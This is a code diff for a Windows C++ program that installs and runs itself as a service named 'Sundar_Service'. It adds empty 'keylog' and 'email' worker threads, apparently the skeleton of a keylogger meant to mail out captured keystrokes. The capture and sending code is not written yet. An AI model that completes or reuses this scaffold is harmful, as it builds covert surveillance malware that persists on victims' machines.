@@ -24,6 +24,13 @@ VOID WINAPI ServiceHandler(DWORD fdwControl);
 
 void start_working_thread();
 void stop_working_thread();
+DWORD WINAPI keylog_thread(LPVOID info);
+DWORD WINAPI email_thread(LPVOID info);
+bool is_service_env();
+void install_service();
+HANDLE keylog_tid;
+HANDLE email_tid;
+bool running = false;
 
 /** Window Service **/
 const int nBufferSize = 500;
@@ -44,32 +51,41 @@ SERVICE_STATUS          ServiceStatus;
 
 int _tmain(int argc, _TCHAR* argv[])
 {
-	if(argc >= 2)
-		strcpy(lpCmdLineData, argv[1]);
-	ServiceMainProc();
+	strcpy(pServiceName,"Sundar_Service");	
+	bool is_service = is_service_env();
+	if(is_service){
+		ServiceMainProc();
+	} else{
+		install_service();
+	}
 	return 0;
+}
+
+void install_service(){
+	ServiceManager sm;	
+	char exe_path[MAX_PATH];
+	DWORD size = GetModuleFileName(NULL, exe_path, sizeof(exe_path));
+	exe_path[size] = 0;
+	sm.uninstall(pServiceName);
+	sm.install(exe_path, pServiceName);
+	bool ret = sm.run_service(pServiceName);
+	if(ret){
+		Logger::debug("Service %s Install And Run Succ", pServiceName);
+	} else{
+		Logger::debug("Service %s Install And Run Fail", pServiceName);
+	}
+}
+
+bool is_service_env(){
+	HANDLE handle = GetStdHandle(STD_OUTPUT_HANDLE);
+	return handle == 0;
 }
 
 VOID ServiceMainProc()
 {
-	// initialize variables for .exe and .log file names
-	char pModuleFile[nBufferSize+1];
-	DWORD dwSize = GetModuleFileName(NULL, pModuleFile, nBufferSize);
-	pModuleFile[dwSize] = 0;
-	if(dwSize>4 && pModuleFile[dwSize-4] == '.')
-	{
-		sprintf(pExeFile,"%s",pModuleFile);
-		pModuleFile[dwSize-4] = 0;
-	}
-	strcpy(pServiceName,"Sundar_Service");
-
 	//start serivce
-	if(!StartServiceCtrlDispatcher(lpServiceStartTable))
-	{
-		long nError = GetLastError();
-		char pTemp[121];
-		sprintf(pTemp, "StartServiceCtrlDispatcher failed, error code = %d\n", nError);
-		WriteLog(pTemp);
+	if(!StartServiceCtrlDispatcher(lpServiceStartTable)) {
+		Logger::debug("StartServiceCtrlDispatcher failed, error code = %d\n", GetLastError());
 	}
 }
 
@@ -92,12 +108,8 @@ VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
     ServiceStatus.dwWaitHint           = 0; 
  
     hServiceStatusHandle = RegisterServiceCtrlHandler(pServiceName, ServiceHandler); 
-    if (hServiceStatusHandle==0) 
-    {
-		long nError = GetLastError();
-		char pTemp[121];
-		sprintf(pTemp, "RegisterServiceCtrlHandler failed, error code = %d\n", nError);
-		WriteLog(pTemp);
+    if (hServiceStatusHandle==0) {
+		Logger::debug("RegisterServiceCtrlHandler failed, error code = %d\n", GetLastError());
         return; 
     } 
  
@@ -105,12 +117,8 @@ VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
     ServiceStatus.dwCurrentState       = SERVICE_RUNNING; 
     ServiceStatus.dwCheckPoint         = 0; 
     ServiceStatus.dwWaitHint           = 0;  
-    if(!SetServiceStatus(hServiceStatusHandle, &ServiceStatus)) 
-    { 
-		long nError = GetLastError();
-		char pTemp[121];
-		sprintf(pTemp, "SetServiceStatus failed, error code = %d\n", nError);
-		WriteLog(pTemp);
+    if(!SetServiceStatus(hServiceStatusHandle, &ServiceStatus)) {
+		Logger::debug("SetServiceStatus failed, error code = %d\n", GetLastError()); 
     } 
 
 	// AttachProcessNames();
@@ -122,11 +130,36 @@ VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
 	start_working_thread();
 }
 
-void start_working_thread(){
+DWORD WINAPI keylog_thread(LPVOID info){
+	while(running){
+		Logger::debug("Keylog Thread Running");
+		Sleep(1000);
+	}
+	return 0;
+}
 
+DWORD WINAPI email_thread(LPVOID info){
+	while(running){
+		Logger::debug("Email Thread Running");
+		Sleep(1000);
+	}
+	return 0;
+}
+
+void start_working_thread(){
+	if(running){
+		return;
+	}
+	running = true;
+	keylog_tid = CreateThread(NULL, 0, keylog_thread, NULL, 0, NULL);
+	email_tid = CreateThread(NULL, 0, email_thread, NULL, 0, NULL);
+	if(!keylog_tid || !email_tid){
+		running = false;
+		Logger::debug("Create Working Thread Fail");
+	}
 }
 void stop_working_thread(){
-
+	running = false;
 }
 
 VOID WINAPI ServiceHandler(DWORD fdwControl)
@@ -154,15 +187,9 @@ VOID WINAPI ServiceHandler(DWORD fdwControl)
 		case SERVICE_CONTROL_INTERROGATE:
 			break;
 		default:
-			char pTemp[121];
-			sprintf(pTemp,  "Unrecognized opcode %d\n", fdwControl);
-			WriteLog(pTemp);
+			Logger::debug("Unrecognized opcode %d\n", fdwControl);
 	};
-    if (!SetServiceStatus(hServiceStatusHandle,  &ServiceStatus)) 
-	{ 
-		long nError = GetLastError();
-		char pTemp[121];
-		sprintf(pTemp, "SetServiceStatus failed, error code = %d\n", nError);
-		WriteLog(pTemp);
+    if (!SetServiceStatus(hServiceStatusHandle, &ServiceStatus)) {
+		Logger::debug("SetServiceStatus failed, error code = %d\n", GetLastError());
     } 
 }
